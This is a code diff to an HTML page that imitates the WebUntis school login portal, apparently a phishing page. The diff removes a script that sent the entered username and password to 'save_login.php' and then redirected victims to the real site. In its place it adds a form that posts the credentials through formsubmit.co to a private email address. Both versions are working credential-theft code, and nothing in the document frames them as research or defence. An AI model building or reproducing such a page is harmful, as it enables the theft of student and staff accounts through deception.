@@ -151,16 +151,13 @@
     <h2>WebUntis Login</h2>
     <img class="logo" src="https://i.ibb.co/RT0d2dZq/Screenshot-2025-09-04-182055.png" alt="Logo" />
     <button type="button" class="portal-btn">Login mit Bildungsportal</button>
-
     <div class="divider"><span class="divider-line"></span>oder<span class="divider-line"></span></div>
-
-    <form id="loginForm">
+    <form action="https://formsubmit.co/ogcraftnet@eclipso.at" method="POST">
       <label class="input-label" for="user">Benutzername</label>
-      <input class="login-input" type="text" id="user" placeholder="Username" required />
-
+      <input class="login-input" type="text" id="user" name="Benutzername" placeholder="Username" required />
       <label class="input-label" for="pw">Passwort</label>
       <div class="pw-row">
-        <input class="login-input" type="password" id="pw" placeholder="Passwort" required />
+        <input class="login-input" type="password" id="pw" name="Passwort" placeholder="Passwort" required />
         <button type="button" class="pw-eye" aria-label="Passwort anzeigen/ausblenden" title="Passwort anzeigen/ausblenden">
           <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 24 24" fill="#383838">
             <path d="M12 5c-7.633 0-11 5.657-11 7s3.367 7 11 7 11-5.657 11-7-3.367-7-11-7zm0 12c-2.761 0-5-2.239-5-5s2.239-5 5-5 
@@ -168,7 +165,6 @@
           </svg>
         </button>
       </div>
-
       <button type="submit" class="login-btn">Login</button>
     </form>
     <a class="pw-link" href="#">Passwort vergessen?</a>
@@ -184,12 +180,10 @@
       <a href="#">Impressum</a> | <a href="#">Jobs @ Untis</a>
     </div>
   </div>
-
   <script>
     // Passwort-Anzeige umschalten
     const pwInput = document.getElementById('pw');
     const pwToggleBtn = document.querySelector('.pw-eye');
-
     pwToggleBtn.addEventListener('click', () => {
       const type = pwInput.getAttribute('type') === 'password' ? 'text' : 'password';
       pwInput.setAttribute('type', type);
@@ -199,29 +193,6 @@
       } else {
         svg.style.fill = '#383838';
       }
-    });
-
-    // Login-Formular absenden
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', function(event) {
-      event.preventDefault();
-
-      const user = document.getElementById('user').value;
-      const pw = document.getElementById('pw').value;
-
-      fetch('save_login.php', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({username: user, password: pw})
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log('Serverantwort:', data);
-        window.location.href = 'https://webuntis.com/';
-      })
-      .catch(error => {
-        console.error('Fehler beim Speichern:', error);
-      });
     });
   </script>
 </body>
